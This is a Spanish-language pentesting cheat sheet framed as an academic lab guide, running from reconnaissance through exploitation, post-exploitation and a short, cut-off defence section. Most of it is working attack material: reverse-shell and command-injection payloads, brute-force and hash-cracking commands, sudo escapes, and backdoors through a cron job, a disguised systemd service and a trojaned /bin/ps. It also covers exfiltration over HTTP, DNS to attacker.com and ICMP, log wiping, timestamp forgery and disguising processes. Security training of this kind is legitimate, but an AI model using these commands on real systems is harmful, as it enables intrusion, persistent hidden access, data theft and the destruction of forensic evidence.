# üìñ BIBLIA DE PENTESTING - GU√çA MAESTRA COMPLETA
*Metodolog√≠a Acad√©mica MIT - Ciberseguridad Avanzada*

---

## üéØ METODOLOG√çA FUNDAMENTAL DE PENTESTING

### Principios Acad√©micos Base
El pentesting profesional sigue una metodolog√≠a estructurada y repetible, basada en frameworks reconocidos como OWASP, NIST y PTES. Esta gu√≠a integra teor√≠a acad√©mica con pr√°ctica profesional de nivel √©lite.

**Marco Conceptual**: RECONOCIMIENTO ‚Üí ENUMERACI√ìN ‚Üí EXPLOTACI√ìN ‚Üí POST-EXPLOTACI√ìN ‚Üí DEFENSA

---

## üîç FASE 1: RECONOCIMIENTO INICIAL

### 1.1 Preparaci√≥n del Entorno de Laboratorio

#### Configuraci√≥n de Conectividad B√°sica
```bash
# Conexi√≥n VPN a entorno objetivo (HTB, TryHackMe, etc.)
sudo openvpn archivo.ovpn
# PROP√ìSITO ACAD√âMICO: Establecer t√∫nel criptogr√°fico seguro para acceso controlado
# FUNDAMENTO: Aislamiento de red para testing √©tico

# Verificaci√≥n de interfaz VPN
ifconfig tun0
# PROP√ìSITO: Confirmar asignaci√≥n de IP en red objetivo y validar conectividad
# PAR√ÅMETROS: tun0 = interfaz de t√∫nel est√°ndar para OpenVPN
```

#### Verificaci√≥n de Conectividad Objetivo
```bash
# Test de conectividad ICMP
ping -c 1 10.10.10.3
# PROP√ìSITO: Verificar alcanzabilidad de objetivo usando protocolo ICMP
# PAR√ÅMETROS DETALLADOS:
# -c 1 = count (enviar solo 1 paquete para eficiencia)
# FUNDAMENTO TE√ìRICO: Confirmar Layer 3 (IP) antes de proceder

# Ver mi propia IP asignada
ip a
ifconfig
# PROP√ìSITO: Identificar interfaz de red activa y rango de IP asignado
# APLICACI√ìN: Determinar contexto de red para configurar herramientas
```

#### Reconocimiento Pasivo Inicial
```bash
# Consulta de informaci√≥n p√∫blica del dominio
whois [dominio]
# PROP√ìSITO: Recopilar informaci√≥n OSINT sin interacci√≥n directa
# INFORMACI√ìN OBTENIDA: Registrante, servidores DNS, rangos IP

# Consultas DNS para subdominios
nslookup [dominio]
dig [dominio] MX
dig [dominio] TXT
# PROP√ìSITO: Mapear infraestructura DNS y servicios asociados
# FUNDAMENTO: Reconocimiento sin alertar sistemas de detecci√≥n
```

### 1.2 Descubrimiento de Red y Hosts Activos

#### Escaneo de Descubrimiento de Hosts
```bash
# Descubrimiento de hosts activos en rango
sudo nmap -sn [rango_red]
# EJEMPLOS PR√ÅCTICOS:
sudo nmap -sn 192.168.1.0/24
sudo nmap -sn 10.10.10.0/24
# PROP√ìSITO ACAD√âMICO: Identificar superficie de ataque disponible
# PAR√ÅMETROS DETALLADOS:
# -sn = "Scan No port" - solo descubrimiento de hosts
# FUNDAMENTO: Mapeo de topolog√≠a antes de enumeraci√≥n profunda
```

#### M√©todos Alternativos de Descubrimiento
```bash
# Descubrimiento usando ARP (red local)
arp-scan -l
sudo nmap -PR 192.168.1.0/24
# PROP√ìSITO: Descubrimiento Layer 2 para redes locales
# VENTAJA: M√°s sigiloso que ICMP, dif√≠cil de detectar

# Descubrimiento usando TCP SYN
sudo nmap -PS22,80,443 192.168.1.0/24
# PROP√ìSITO: Usar puertos comunes para descubrimiento
# FUNDAMENTO: Hosts que bloquean ICMP pueden responder TCP
```

---

## üîç FASE 2: ENUMERACI√ìN DE SERVICIOS

### 2.1 Escaneo Completo de Puertos

#### Escaneo Agresivo y Completo
```bash
# Escaneo completo de todos los puertos TCP
nmap -p- --open -sS --min-rate 5000 -n -Pn [IP_objetivo] -oG allPorts
# PROP√ìSITO ACAD√âMICO: Mapeo completo de superficie de ataque TCP
# PAR√ÅMETROS ACAD√âMICOS DETALLADOS:
# -p-           = Escanear todos los 65,535 puertos TCP
# --open        = Filtrar solo puertos en estado OPEN
# -sS           = SYN Scan (TCP Half-Open) - sigiloso y eficiente
# --min-rate    = Velocidad m√≠nima paquetes/segundo (agresivo)
# -n            = Deshabilitar resoluci√≥n DNS (optimizaci√≥n)
# -Pn           = Omitir descubrimiento de host (asumir activo)
# -oG           = Output Grepeable para procesamiento automatizado
```

#### Procesamiento Automatizado de Resultados
```bash
# Extracci√≥n y formateo de puertos abiertos
cat allPorts | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ','
# PROP√ìSITO: Automatizaci√≥n de parsing para input en siguiente fase
# DESGLOSE DEL PIPELINE:
# grep -oP '\d{1,5}/open' = Regex para extraer puertos con estado open
# awk '{print $1}' FS='/'  = Usar / como delimitador, extraer solo n√∫mero
# xargs                    = Conversi√≥n multilinea a linea √∫nica
# tr ' ' ','              = Transformar espacios a formato CSV
# RESULTADO ESPERADO: 21,22,139,445,3632
```

### 2.2 Enumeraci√≥n Profunda de Servicios

#### Escaneo Detallado con Scripts
```bash
# Enumeraci√≥n exhaustiva de servicios identificados
nmap -p [puertos_encontrados] -sC -sV [IP_objetivo] -oN targeted
# EJEMPLO: nmap -p 21,22,139,445,3632 -sC -sV 10.10.10.3 -oN targeted
# PROP√ìSITO ACAD√âMICO: Identificaci√≥n precisa de servicios y versiones
# PAR√ÅMETROS DETALLADOS:
# -sC = Script scan - ejecuta scripts NSE por defecto
# -sV = Version detection - fingerprinting de servicios
# -oN = Output normal para an√°lisis humano
# FUNDAMENTO: Informaci√≥n de versiones es cr√≠tica para exploit selection
```

#### Verificaci√≥n de Conectividad por Puerto
```bash
# Test de conectividad espec√≠fica por puerto
nc -zv [IP] [puerto]
telnet [IP] [puerto]
# PROP√ìSITO: Verificaci√≥n manual de servicios espec√≠ficos
# PAR√ÅMETROS:
# -z = Zero-I/O mode (no transferir datos)
# -v = Verbose (informaci√≥n detallada)
# APLICACI√ìN: Validar resultados de nmap y test manual
```

### 2.3 Enumeraci√≥n Espec√≠fica por Protocolo

#### FTP (Puerto 21) - Enumeraci√≥n Completa
```bash
# Verificar acceso an√≥nimo FTP
ftp [IP_objetivo]
# Usuario: anonymous
# Password: (vac√≠o, anonymous, o email)
# PROP√ìSITO ACAD√âMICO: Verificar misconfiguration com√∫n

# Comandos dentro de sesi√≥n FTP
ftp> ls -la
ftp> dir
ftp> binary           # Modo binario para archivos
ftp> get [archivo]    # Descargar archivo
ftp> put [archivo]    # Subir archivo (si permitido)
# PROP√ìSITO: Exploraci√≥n de filesystem y verificaci√≥n de permisos

# Enumeraci√≥n automatizada FTP
nmap -p 21 --script ftp-anon,ftp-bounce,ftp-proftpd-backdoor [IP]
# PROP√ìSITO: Scripts especializados para vulnerabilidades FTP conocidas
```

#### SSH (Puerto 22) - An√°lisis de Seguridad
```bash
# Enumeraci√≥n de algoritmos SSH
nmap -p 22 --script ssh-enum-algos [IP_objetivo]
# PROP√ìSITO: Identificar algoritmos criptogr√°ficos soportados

# Verificaci√≥n de usuarios v√°lidos (si disponible)
nmap -p 22 --script ssh-enum-users --script-args userdb=users.txt [IP]
# PROP√ìSITO: Enumeraci√≥n de usuarios del sistema

# Banner grabbing manual
nc [IP] 22
# PROP√ìSITO: Obtener informaci√≥n de versi√≥n directa del servicio
```

#### SMB/NetBIOS (Puertos 139, 445) - Enumeraci√≥n Exhaustiva
```bash
# Listado de recursos compartidos
smbclient -L //[IP_objetivo] -N
# PROP√ìSITO: Enumeraci√≥n de shares sin autenticaci√≥n
# PAR√ÅMETROS:
# -L = List resources
# -N = No password (null session)

# Enumeraci√≥n completa con enum4linux
enum4linux -a [IP_objetivo]
# PROP√ìSITO ACAD√âMICO: Extracci√≥n completa de informaci√≥n SMB
# INCLUYE: Usuarios, grupos, shares, pol√≠ticas, domain info

# Conexi√≥n a recursos espec√≠ficos
smbclient //[IP]/[resource] -N
smbclient //[IP]/ADMIN$ -N
# PROP√ìSITO: Acceso directo a recursos administrativos

# Scripts NSE para SMB
nmap -p 445 --script smb-enum-shares,smb-enum-users,smb-vuln* [IP]
# PROP√ìSITO: Enumeraci√≥n automatizada y detecci√≥n de vulnerabilidades
```

#### An√°lisis de Puertos, Procesos y Servicios (Integrado)
```bash
# Vista completa de conexiones y servicios
sudo ss -tunap
sudo netstat -tunap
# PROP√ìSITO ACAD√âMICO: An√°lisis completo del estado de red
# PAR√ÅMETROS DETALLADOS:
# -t = TCP sockets √∫nicamente
# -u = UDP sockets √∫nicamente  
# -n = Formato num√©rico (no resolver nombres)
# -a = All sockets (escucha y establecidas)
# -p = Mostrar Process ID y nombre

# Servicios en escucha √∫nicamente
sudo ss -tuln
sudo netstat -tuln
# PROP√ìSITO: Identificar servicios activos esperando conexiones
# APLICACI√ìN: Mapear superficie de ataque local

# Identificar proceso usando puerto espec√≠fico
sudo ss -tulnp | grep [PUERTO]
sudo lsof -i :[PUERTO]
# PROP√ìSITO: Correlacionar puerto con proceso espec√≠fico
# FUNDAMENTO: Essential para troubleshooting y an√°lisis forense
```

---

## ‚öîÔ∏è FASE 3: EXPLOTACI√ìN

### 3.1 B√∫squeda y An√°lisis de Vulnerabilidades

#### B√∫squeda con Searchsploit (Base de Datos Local)
```bash
# B√∫squeda por servicio y versi√≥n
searchsploit [servicio] [versi√≥n]
# EJEMPLOS PR√ÅCTICOS:
searchsploit samba 3.0.20
searchsploit distccd
searchsploit apache 2.4.41
# PROP√ìSITO ACAD√âMICO: Correlaci√≥n de versiones con vulnerabilidades conocidas

# Copiar exploit para an√°lisis
searchsploit -m [ID_exploit]
# PROP√ìSITO: Obtener c√≥digo fuente para an√°lisis y customizaci√≥n
# FUNDAMENTO: Comprensi√≥n profunda antes de ejecuci√≥n
```

#### Framework Metasploit - Uso Acad√©mico Riguroso
```bash
# Inicializaci√≥n optimizada
msfconsole -q
# PROP√ìSITO: Carga r√°pida del framework
# -q = Quiet mode (suprime banner para eficiencia)

# B√∫squeda de m√≥dulos espec√≠ficos
search [criterio]
# EJEMPLOS ESPECIALIZADOS:
search samba usermap
search distccd
search type:exploit platform:linux
# PROP√ìSITO: Localizaci√≥n precisa de m√≥dulos de explotaci√≥n

# Selecci√≥n y configuraci√≥n de exploit
use exploit/multi/samba/usermap_script
show options
show payloads
# PROP√ìSITO ACAD√âMICO: Comprensi√≥n de par√°metros requeridos

# Configuraci√≥n de par√°metros cr√≠ticos
set RHOSTS [IP_objetivo]
set LHOST [IP_atacante]
set LPORT [puerto_local]
# PROP√ìSITO: Configuraci√≥n de vectores de comunicaci√≥n

# Ejecuci√≥n controlada
exploit
# O alternativamente: run
# PROP√ìSITO: Lanzamiento de exploit con configuraci√≥n validada
```

### 3.2 Ataques de Fuerza Bruta con Hydra

#### Ataques contra SSH
```bash
# Preparaci√≥n de listas de usuarios
echo -e "root\nadmin\nuser\ntest\nguest\nmakis\nadministrator" > users.txt
# PROP√ìSITO: Lista curada de usuarios comunes en sistemas objetivo

# Ataque de fuerza bruta SSH optimizado
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://[IP_objetivo]
# PROP√ìSITO ACAD√âMICO: Ataque automatizado contra autenticaci√≥n SSH
# PAR√ÅMETROS DETALLADOS:
# -L = Lista de usuarios (List)
# -P = Lista de passwords (Password list)
# ssh:// = Protocolo espec√≠fico

# Ataque enfocado con throttling
hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 4 -w 3 ssh://[IP]
# PROP√ìSITO: Ataque sigiloso con limitaci√≥n de velocidad
# PAR√ÅMETROS AVANZADOS:
# -l = Usuario espec√≠fico (lowercase single)
# -t 4 = 4 threads m√°ximo
# -w 3 = 3 segundos wait entre intentos
# FUNDAMENTO: Evasi√≥n de sistemas de detecci√≥n por rate limiting
```

#### Ataques contra FTP
```bash
# Fuerza bruta FTP b√°sica
hydra -L users.txt -P passwords.txt ftp://[IP_objetivo]
# PROP√ìSITO: Compromiso de servicio FTP

# Ataque FTP con par√°metros de evasi√≥n
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -t 2 -w 5 ftp://[IP]
# PROP√ìSITO: Ataque controlado para evitar lockouts de cuenta
```

#### Ataques contra Servicios Web
```bash
# HTTP Basic Auth
hydra -L users.txt -P passwords.txt http-get://[IP]/admin/
# PROP√ìSITO: Compromiso de autenticaci√≥n b√°sica HTTP

# HTTP POST (formularios)
hydra -L users.txt -P passwords.txt [IP] http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect"
# PROP√ìSITO: Ataque contra formularios de login web
# PAR√ÅMETROS:
# ^USER^/^PASS^ = Placeholders para usuario y password
# F=incorrect = String de falla para identificar login fallido
```

### 3.3 Cracking de Hashes con John the Ripper

#### Extracci√≥n de Hashes del Sistema
```bash
# Combinaci√≥n de archivos del sistema para John
unshadow /etc/passwd /etc/shadow > hashes.txt
# PROP√ìSITO ACAD√âMICO: Preparaci√≥n de hashes para an√°lisis criptogr√°fico
# FUNDAMENTO: Combinaci√≥n de informaci√≥n p√∫blica y privada del sistema

# Identificaci√≥n de formatos de hash
john --list=formats | grep -i [tipo]
# EJEMPLOS:
john --list=formats | grep -i md5
john --list=formats | grep -i sha
# PROP√ìSITO: Identificar algoritmo criptogr√°fico correcto
```

#### T√©cnicas de Cracking Avanzadas
```bash
# Cracking b√°sico con reglas por defecto
john hashes.txt
# PROP√ìSITO: Ataque usando patrones y mutaciones predefinidas

# Ataque con diccionario espec√≠fico
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
# PROP√ìSITO: Ataque basado en passwords comunes reales

# Cracking con reglas avanzadas
john --rules --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
# PROP√ìSITO ACAD√âMICO: Aplicaci√≥n de mutaciones algor√≠tmicas
# FUNDAMENTO: Las reglas generan variaciones autom√°ticas (ej: password123, Password123, p@ssword123)

# Mostrar passwords crackeados
john --show hashes.txt
# PROP√ìSITO: Visualizaci√≥n de credenciales comprometidas

# Cracking de tipos espec√≠ficos
john --format=raw-md5 --wordlist=rockyou.txt hash.txt
john --format=raw-sha1 --wordlist=rockyou.txt hash.txt
# PROP√ìSITO: Ataques optimizados por algoritmo espec√≠fico
```

### 3.4 Payloads de Inyecci√≥n Manual

#### Inyecci√≥n de Comandos en Aplicaciones Web
```bash
# Payloads b√°sicos de command injection
127.0.0.1; whoami
127.0.0.1; uname -a
127.0.0.1 && id
127.0.0.1 | whoami
# PROP√ìSITO ACAD√âMICO: Explotaci√≥n de validaci√≥n insuficiente de input

# Payloads de timing (blind injection)
127.0.0.1; sleep 5 && echo "test"
127.0.0.1; ping -c 5 127.0.0.1
# PROP√ìSITO: Detectar inyecci√≥n cuando no hay output visible

# Reverse shell payloads
127.0.0.1; bash -i >& /dev/tcp/[IP_atacante]/4444 0>&1
127.0.0.1; python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[IP]",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash"])'
# PROP√ìSITO: Establecimiento de acceso remoto persistente

# Payloads persistentes
127.0.0.1; nohup bash -c 'bash -i >& /dev/tcp/[IP]/[PUERTO] 0>&1' &
# PROP√ìSITO: Shell que sobrevive cierre de conexi√≥n original
# FUNDAMENTO: nohup + & = ejecuci√≥n en background sin hangup
```

---

## üöÄ FASE 4: POST-EXPLOTACI√ìN

### 4.1 Reconocimiento Post-Explotaci√≥n

#### An√°lisis Inicial del Sistema Comprometido
```bash
# Verificaci√≥n de identidad y privilegios
whoami
# PROP√ìSITO: Confirmar contexto de usuario actual

id
# PROP√ìSITO ACAD√âMICO: An√°lisis completo de privilegios (UID, GID, grupos)
# INFORMACI√ìN CR√çTICA: Determina vectores de escalaci√≥n disponibles

# Informaci√≥n del sistema operativo
uname -a
cat /etc/os-release
cat /proc/version
# PROP√ìSITO: Fingerprinting completo del sistema objetivo
# APLICACI√ìN: Identificar kernel y distribuci√≥n para exploit selection

# Enumeraci√≥n de usuarios del sistema
cat /etc/passwd
cat /etc/group
# PROP√ìSITO: Mapeo de usuarios y estructura de permisos

# Procesos en ejecuci√≥n
ps aux
ps -eo pid,ppid,user,command
# PROP√ìSITO: An√°lisis de procesos activos y propietarios
# FUNDAMENTO: Identificar servicios vulnerables y contextos de ejecuci√≥n
```

#### An√°lisis de Red Interna
```bash
# Descubrimiento de red interna desde host comprometido
for i in {1..254}; do ping -c 1 -W 1 192.168.1.$i 2>/dev/null | grep "64 bytes"; done
# PROP√ìSITO ACAD√âMICO: Mapeo de red interna para movimiento lateral
# FUNDAMENTO: Host comprometido como pivot para reconocimiento

# An√°lisis de tabla ARP
arp -a
ip neigh
# PROP√ìSITO: Identificar hosts que han comunicado recientemente
# INFORMACI√ìN: MAC addresses y asociaciones IP

# An√°lisis de conexiones activas
netstat -tupln
ss -tupln
# PROP√ìSITO: Mapear comunicaciones activas desde host comprometido
```

### 4.2 Escalaci√≥n de Privilegios

#### Enumeraci√≥n de Vectores de Escalaci√≥n
```bash
# Verificaci√≥n de permisos sudo
sudo -l
# PROP√ìSITO ACAD√âMICO: Identificar comandos ejecutables con privilegios elevados
# INFORMACI√ìN CR√çTICA: Vectores directos de escalaci√≥n

# B√∫squeda de binarios SUID
find / -perm -4000 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
# PROP√ìSITO: Localizar binarios que se ejecutan con privilegios del propietario
# FUNDAMENTO TE√ìRICO: SUID bit permite escalaci√≥n horizontal/vertical

# B√∫squeda de archivos escribibles cr√≠ticos
find / -writable 2>/dev/null | grep -v proc | grep -v sys
# PROP√ìSITO: Identificar archivos modificables que puedan ser explotados

# An√°lisis de tareas programadas
crontab -l
cat /etc/crontab
ls -la /etc/cron.*
# PROP√ìSITO: Identificar tareas automatizadas potencialmente explotables
```

#### Explotaci√≥n de Sudo/SUID (Referencia GTFOBins)
```bash
# Escalaci√≥n usando nmap con sudo
sudo nmap --interactive
nmap> !sh
# PROP√ìSITO: Abuso de funcionalidad leg√≠tima para escalaci√≥n
# FUNDAMENTO: Modo interactivo hereda privilegios de ejecuci√≥n

# Otros vectores comunes de GTFOBins
sudo vim -c ':!/bin/sh'
sudo find /etc -exec sh -i \;
sudo awk 'BEGIN {system("/bin/sh")}'
# PROP√ìSITO ACAD√âMICO: Demostrar m√∫ltiples vectores de escalaci√≥n
```

#### Scripts de Automatizaci√≥n para Escalaci√≥n
```bash
# LinEnum - Enumeraci√≥n automatizada
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh
# PROP√ìSITO: Automatizaci√≥n de b√∫squeda de vectores de escalaci√≥n

# LinPEAS - An√°lisis exhaustivo
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
# PROP√ìSITO ACAD√âMICO: An√°lisis automatizado y scoring de vulnerabilidades
# VENTAJA: Identificaci√≥n de vectores complejos no obvios
```

### 4.3 T√©cnicas Avanzadas de Persistencia

#### Backdoors en Servicios del Sistema
```bash
# Persistencia via crontab (sigilosa)
echo "*/10 * * * * /bin/bash -c 'bash -i >& /dev/tcp/[IP_atacante]/4444 0>&1'" >> /var/spool/cron/root
# PROP√ìSITO ACAD√âMICO: Persistencia temporal automatizada
# FUNDAMENTO: Aprovechamiento de scheduler del sistema

# Persistencia via systemd service
cat > /etc/systemd/system/system-update.service << EOF
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/[IP_atacante]/4444 0>&1'
Restart=always
RestartSec=60
User=root

[Install]
WantedBy=multi-user.target
EOF
systemctl enable system-update.service
systemctl start system-update.service
# PROP√ìSITO: Persistencia robusta integrada al sistema
# VENTAJA: Reinicio autom√°tico, dif√≠cil detecci√≥n
```

#### Modificaci√≥n de Binarios Leg√≠timos
```bash
# Backup de binario original
cp /bin/ps /bin/ps.bak
# PROP√ìSITO: Preservar funcionalidad original

# Creaci√≥n de wrapper malicioso
cat > /tmp/ps_wrapper.sh << 'EOF'
#!/bin/bash
# Ejecutar funcionalidad original
/bin/ps.bak "$@"
# Ejecutar payload en background
bash -i >& /dev/tcp/[IP_atacante]/4444 0>&1 &
EOF
chmod +x /tmp/ps_wrapper.sh
mv /tmp/ps_wrapper.sh /bin/ps
# PROP√ìSITO ACAD√âMICO: Backdoor transparente en comando com√∫n
# FUNDAMENTO: Interceptaci√≥n de comandos rutinarios del sistema
```

### 4.4 Movimiento Lateral Avanzado

#### SSH Tunneling y Port Forwarding
```bash
# T√∫nel local (Local Port Forwarding)
ssh -L [puerto_local]:127.0.0.1:[puerto_remoto] user@[IP_objetivo]
# EJEMPLO: ssh -L 8080:127.0.0.1:80 user@192.168.1.100
# PROP√ìSITO ACAD√âMICO: Acceso a servicios internos via SSH
# FUNDAMENTO: Encapsulaci√≥n de tr√°fico en canal cifrado

# T√∫nel remoto (Remote Port Forwarding)
ssh -R [puerto_remoto]:127.0.0.1:[puerto_local] user@[IP_atacante]
# PROP√ìSITO: Exposici√≥n de servicios del host comprometido

# T√∫nel din√°mico (SOCKS Proxy)
ssh -D [puerto_local] user@[IP_objetivo]
# EJEMPLO: ssh -D 9050 user@192.168.1.100
# PROP√ìSITO: Proxy SOCKS para enrutamiento de herramientas
# APLICACI√ìN: Usar con proxychains para pivoting
```

#### Pivoting con Chisel (Herramienta Moderna)
```bash
# Descarga y preparaci√≥n
wget https://github.com/jpillora/chisel/releases/latest/download/chisel_linux_amd64.gz
gunzip chisel_linux_amd64.gz
chmod +x chisel_linux_amd64
mv chisel_linux_amd64 chisel
# PROP√ìSITO: Herramienta moderna de tunneling HTTP

# Servidor Chisel (en Kali atacante)
./chisel server --port 9999 --reverse
# PROP√ìSITO: Configurar servidor para conexiones reversas
# VENTAJA: T√∫neles HTTP que evaden firewalls

# Cliente Chisel (en host comprometido)
./chisel client [IP_atacante]:9999 R:8080:192.168.1.200:80
# PROP√ìSITO ACAD√âMICO: T√∫nel reverso hacia host interno
# EXPLICACI√ìN: Redirige puerto 8080 local a puerto 80 de 192.168.1.200
```

#### Configuraci√≥n de Proxychains
```bash
# Configuraci√≥n de proxy SOCKS
echo "socks5 127.0.0.1 9050" >> /etc/proxychains4.conf
# PROP√ìSITO: Configurar enrutamiento de herramientas via proxy

# Uso de herramientas a trav√©s del proxy
proxychains nmap -sT -Pn [IP_objetivo_interno]
proxychains curl http://192.168.1.200
# PROP√ìSITO ACAD√âMICO: Enrutamiento de tr√°fico via host comprometido
# FUNDAMENTO: Acceso a redes internas no accesibles directamente
```

### 4.5 B√∫squeda de Informaci√≥n Sensible

#### Enumeraci√≥n de Credenciales y Configuraciones
```bash
# Buscar archivos de configuraci√≥n con credenciales
find / -type f -name "*.conf" -exec grep -l "password\|passwd\|pwd\|key" {} \; 2>/dev/null
# PROP√ìSITO ACAD√âMICO: Localizaci√≥n de credenciales hardcodeadas

# Buscar strings de conexi√≥n a bases de datos
find / -name "*.php" -o -name "*.py" -o -name "*.pl" | xargs grep -l "mysql\|postgresql\|oracle\|mongodb" 2>/dev/null
# PROP√ìSITO: Identificar aplicaciones con acceso a bases de datos

# Localizar claves SSH privadas
find / -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" -o -name "*.pem" 2>/dev/null
# PROP√ìSITO: Encontrar claves para movimiento lateral

# An√°lisis de historial de comandos
find /home -name ".bash_history" -o -name ".zsh_history" -o -name ".history" 2>/dev/null
cat /root/.bash_history 2>/dev/null
# PROP√ìSITO: Buscar comandos ejecutados que revelen credenciales o configuraciones
```

#### Extracci√≥n de Informaci√≥n de Procesos
```bash
# An√°lisis de procesos con datos sensibles
ps aux | grep -E "mysql|postgres|apache|nginx|redis"
# PROP√ìSITO: Identificar procesos que manejan datos cr√≠ticos

# Examinar variables de entorno de procesos
cat /proc/[PID]/environ | tr '\0' '\n'
# PROP√ìSITO ACAD√âMICO: Extracci√≥n de credenciales de variables de entorno
# FUNDAMENTO: Procesos a menudo almacenan configuraci√≥n en ENV vars

# An√°lisis de archivos abiertos por procesos
lsof -p [PID]
# PROP√ìSITO: Ver archivos y conexiones activas de proceso espec√≠fico
```

### 4.6 Exfiltraci√≥n de Datos

#### Compresi√≥n y Preparaci√≥n de Datos
```bash
# Compresi√≥n sigilosa de datos sensibles
tar -czf /tmp/.backup.tar.gz /home/*/Documents /home/*/Desktop /var/www 2>/dev/null
# PROP√ìSITO: Preparar datos para exfiltraci√≥n
# FUNDAMENTO: Compresi√≥n reduce tiempo de transferencia

# B√∫squeda de archivos valiosos
find / -type f \( -name "*.xls*" -o -name "*.doc*" -o -name "*.pdf" -o -name "*.db" \) 2>/dev/null
# PROP√ìSITO ACAD√âMICO: Localizaci√≥n automatizada de informaci√≥n de valor
```

#### M√©todos de Exfiltraci√≥n
```bash
# Exfiltraci√≥n HTTP POST
curl -X POST -F "file=@/tmp/.backup.tar.gz" http://[IP_atacante]:8080/upload
# PROP√ìSITO: Transferencia de datos via HTTP est√°ndar

# Exfiltraci√≥n via DNS (muy sigilosa)
xxd -p /tmp/secret.txt | fold -w32 | while read line; do dig $line.attacker.com; done
# PROP√ìSITO ACAD√âMICO: Exfiltraci√≥n usando protocolo DNS
# VENTAJA: DNS rara vez es bloqueado por firewalls
# FUNDAMENTO: Encapsulaci√≥n de datos en consultas DNS leg√≠timas

# Exfiltraci√≥n via ICMP
xxd -p /tmp/data.txt | fold -w32 | while read line; do ping -c 1 -s 56 -p $line [IP_atacante]; done
# PROP√ìSITO: Usar paquetes ICMP para transferir datos
# FUNDAMENTO: ICMP com√∫nmente permitido en redes corporativas
```

### 4.7 T√©cnicas de Evasi√≥n y Anti-Forense

#### Limpieza de Evidencias
```bash
# Limpieza de logs del sistema
echo "" > /var/log/auth.log
echo "" > /var/log/syslog
echo "" > /var/log/apache2/access.log
echo "" > /var/log/nginx/access.log
# PROP√ìSITO ACAD√âMICO: Eliminaci√≥n de evidencia de acceso
# FUNDAMENTO: Dificultarincident response y an√°lisis forense

# Limpieza de historial de comandos
history -c
echo "" > ~/.bash_history
unset HISTFILE
# PROP√ìSITO: Borrar rastro de comandos ejecutados

# Manipulaci√≥n de timestamps
touch -r /bin/ls /path/to/malicious/file
# PROP√ìSITO: Modificar timestamps para ocultar actividad maliciosa
# FUNDAMENTO: Coincidencia con archivos leg√≠timos del sistema
```

#### Ofuscaci√≥n de Comandos
```bash
# Codificaci√≥n Base64 para evasi√≥n
echo "cat /etc/shadow" | base64
echo "Y2F0IC9ldGMvc2hhZG93Cg==" | base64 -d | sh
# PROP√ìSITO ACAD√âMICO: Ofuscaci√≥n de comandos sensibles
# FUNDAMENTO: Evasi√≥n de logging y sistemas de detecci√≥n

# Fragmentaci√≥n de comandos con variables
a='cat'; b='/etc/'; c='shadow'; $a $b$c
# PROP√ìSITO: Fragmentar comandos para evitar detecci√≥n por firmas

# Ejecuci√≥n con timing aleatorio
sleep $((RANDOM % 300 + 60)) && /path/to/malicious/command
# PROP√ìSITO: Introducir delays aleatorios para evitar patrones detectables
```

#### Ocultaci√≥n de Procesos y Archivos
```bash
# Crear directorios con nombres poco visibles
mkdir /var/tmp/...
mkdir /tmp/.hidden
mkdir /dev/shm/.cache
# PROP√ìSITO: Almacenamiento sigiloso de herramientas

# Procesos con nombres enga√±osos
cp /bin/bash /tmp/[kthread]
/tmp/[kthread] -c 'bash -i >& /dev/tcp/[IP]/4444 0>&1'
# PROP√ìSITO ACAD√âMICO: Disfrazar procesos maliciosos como procesos del kernel
# FUNDAMENTO: Nombres entre corchetes aparentan ser procesos del sistema
```

### 4.8 An√°lisis de Vulnerabilidades del Kernel

#### Identificaci√≥n de Versi√≥n del Kernel
```bash
# Informaci√≥n detallada del kernel
uname -r
cat /proc/version
cat /etc/issue
# PROP√ìSITO: Obtener informaci√≥n exacta para b√∫squeda de exploits

# B√∫squeda de exploits locales
searchsploit linux kernel [versi√≥n]
searchsploit ubuntu [versi√≥n]
# EJEMPLO: searchsploit linux kernel 4.15
# PROP√ìSITO ACAD√âMICO: Correlaci√≥n versi√≥n-vulnerabilidad
```

#### Ejecuci√≥n de Exploits Locales
```bash
# Compilaci√≥n de exploit del kernel
gcc -o exploit exploit.c
chmod +x exploit
./exploit
# PROP√ìSITO: Escalaci√≥n via vulnerabilidades del kernel
# PRECAUCI√ìN ACAD√âMICA: Pueden causar inestabilidad del sistema
```

---

## üõ°Ô∏è FASE 5: DEFENSA Y DETECCI√ìN

### 5.1 Detecci√≥n de Actividad Maliciosa

#### Monitoreo de Logs en Tiempo Real
```bash
# Monitoreo de intentos de autenticaci√≥n
tail -f /var/log/auth.log | grep -i "failed\|invalid\|error"
# PROP√ìSITO DEFENSIVO: Detecci√≥n de ataques de fuerza bruta en tiempo real

# Monitoreo de accesos web
tail -f /var/log/apache2/access.log | grep -E "POST|GET.*\.\."
# PROP√ìSITO: Detecci√≥n de intentos de path traversal y ataques web

# An√°lisis de conexiones sospechosas
netstat -tupln | grep ESTABLISHED | awk '{print $5}' | sort | uniq -c | sort -nr
# PROP√ìSITO ACAD√âMICO: Identificar conexiones an√≥malas por frecuencia
```

#### An√°lisis Forense B√°sico
```bash
# Identificar archivos modificados recientemente
find / -type f -mtime -1 2>/dev/null | head -50
# PROP√ìSITO: Detectar archivos modificados en las √∫ltimas 24 horas

# An√°lisis de procesos sospechosos
ps aux --sort=-%cpu | head -20
ps aux --sort=-%mem | head -20
# PROP√ìSITO: Identificar procesos con uso an√≥malo de recursos

# Verificaci√≥n de integridad de binarios cr√≠ticos
which ps ls cat grep | xargs ls -la
# PROP√ìSITO: Verificar si binarios han sido modificados (timestamps, tama√±os)
```

### 5.2 Hardening y Protecci√≥n

#### Configuraci√≥n de Firewall (iptables)
```bash
# Ver reglas actuales
iptables -L -n -v
# PROP√ìSITO: An√°lisis del estado actual del firewall

# Bloquear IP espec√≠fica
iptables -A INPUT -s [IP_maliciosa] -j DROP
